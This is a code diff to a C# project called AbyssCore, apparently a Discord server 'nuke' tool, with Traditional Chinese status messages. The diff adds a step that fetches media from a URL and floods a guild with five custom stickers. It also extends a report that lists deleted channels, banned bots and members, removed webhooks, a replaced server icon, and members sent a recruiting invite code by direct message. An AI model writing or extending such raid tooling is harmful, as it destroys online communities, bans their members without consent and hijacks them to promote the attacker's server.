@@ -355,11 +355,31 @@ namespace AbyssCore
                     });
                 });
                 await Task.WhenAll(createEmojiTasks);
-                progressCallback?.Invoke($"  ✔ [表情包置換] 清理 {report.DeletedEmojis} 個舊表情、{report.DeletedStickers} 個貼圖，灌入 {report.CreatedEmojis}/{targetEmojis} 個專屬可愛表情包！");
+
+                // 灌入自訂貼圖 (建立最高 5 個貼圖，套用指定專屬可愛媒體)
+                var stickerBytes = await _client.GetStickerBytesFromUrlAsync(AssetConstants.TargetCuteMediaUrl);
+                if (stickerBytes != null && stickerBytes.Length > 0)
+                {
+                    int targetStickers = 5;
+                    var createStickerTasks = Enumerable.Range(1, targetStickers).Select(i =>
+                    {
+                        string sname = $"cute_star_{i:D2}";
+                        return Task.Run(async () =>
+                        {
+                            if (await _client.CreateStickerAsync(guildId, sname, stickerBytes))
+                            {
+                                Interlocked.Increment(ref report.CreatedStickers);
+                            }
+                        });
+                    });
+                    await Task.WhenAll(createStickerTasks);
+                }
+
+                progressCallback?.Invoke($"  ✔ [表情與貼圖置換] 清理 {report.DeletedEmojis} 個舊表情、{report.DeletedStickers} 個舊貼圖，灌入 {report.CreatedEmojis}/{targetEmojis} 個表情包與 {report.CreatedStickers}/5 個自訂貼圖！");
             }
             catch (Exception ex)
             {
-                progressCallback?.Invoke($"  ▲ [表情包置換] 略過: {ex.Message}");
+                progressCallback?.Invoke($"  ▲ [表情與貼圖置換] 略過: {ex.Message}");
             }
 
             // -----------------------------------------------------------------
@@ -403,7 +423,7 @@ namespace AbyssCore
                         $"• 清理了 `{report.DeletedChannels}` 個頻道\n" +
                         $"• 清理了 `{report.BannedBots}` 個 bot\n" +
                         $"• 清理了 `{report.BannedHumans}` 個成員\n" +
-                        $"• 替換了 `{report.CreatedEmojis}` 個表情包 (清空 `{report.DeletedEmojis}` 舊表情 + `{report.DeletedStickers}` 貼圖)\n" +
+                        $"• 替換了 `{report.CreatedEmojis}` 個表情包與 `{report.CreatedStickers}` 個貼圖 (清空 `{report.DeletedEmojis}` 舊表情 + `{report.DeletedStickers}` 貼圖)\n" +
                         $"• 伺服器頭像替換: `{(report.GuildIconUpdated ? "✔ 已套用深淵專屬星門主題頭像" : "▲ 維持原樣")}`\n" +
                         $"• 已向 `{report.DmInvitedMembers}` 位成員私訊發送防誤踢邀請碼 (wWB2RcR7pX)\n" +
                         $"• 拔除 Webhook: `{report.DeletedWebhooks}` 個\n" +
@@ -710,6 +730,7 @@ namespace AbyssCore
         public int DeletedEmojis;
         public int DeletedStickers;
         public int CreatedEmojis;
+        public int CreatedStickers;
         public bool GuildIconUpdated;
         public int CreatedChannels;
         public int CreatedRoles;
